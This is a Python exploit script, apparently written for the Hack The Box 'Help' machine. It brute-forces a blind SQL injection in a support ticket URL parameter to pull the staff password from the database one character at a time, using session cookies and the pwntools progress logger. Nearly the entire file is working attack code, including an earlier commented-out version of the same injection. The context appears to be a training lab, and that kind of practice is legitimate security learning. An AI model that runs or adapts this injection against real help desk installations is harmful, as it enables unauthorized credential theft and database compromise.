#!/usr/bin/python3

import requests
import string
from pwn import *

chars = list(string.ascii_lowercase)+list(string.digits)
password=[]

# key = 1 
# while key <= 40:
#     for i in chars:
        
#         # # exploit = f"+and+substr((select+password+from+staff+limit+0,1),{key},1)+=+'{i}'--+-"
#         url=f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]= 6 and substr((select password from staff limit 0,1),{key},1) = '{i}'---"
#         print(url)
#         cookies={
#             "lang":"english",
#             "PHPSESSID":"72uagk063bprau7e0anq28see5",
#             "usrhash":"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BH0Pk%2BczKWq6Hawvh7BM5KD7p6iD%2BntpTQfI9orovtJFw%3D%3D"
#         }
#         ress = requests.get(url=url, cookies=cookies)
#         print(ress.url)
#         if "404" not in ress.text:
#             password.append(i)
#             print("password: ".join(password))
#             key+=1
#         break

cookies={
    "lang":"english",
    "PHPSESSID":"72uagk063bprau7e0anq28see5"
}
password=""
positions=range(0,100)
p1 = log.progress("Brute force")
for position in positions:
    for char in chars:
        url = f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=6&param[]=attachment&param[]=1&param[]=8 and substr((select password from staff limit 0,1),{position},1)='{char}'-- -"
        ress = requests.get(url=url, cookies=cookies)
        if "404" not in ress.text:
            password += char
            p1.status("password is:  "+password)
            break
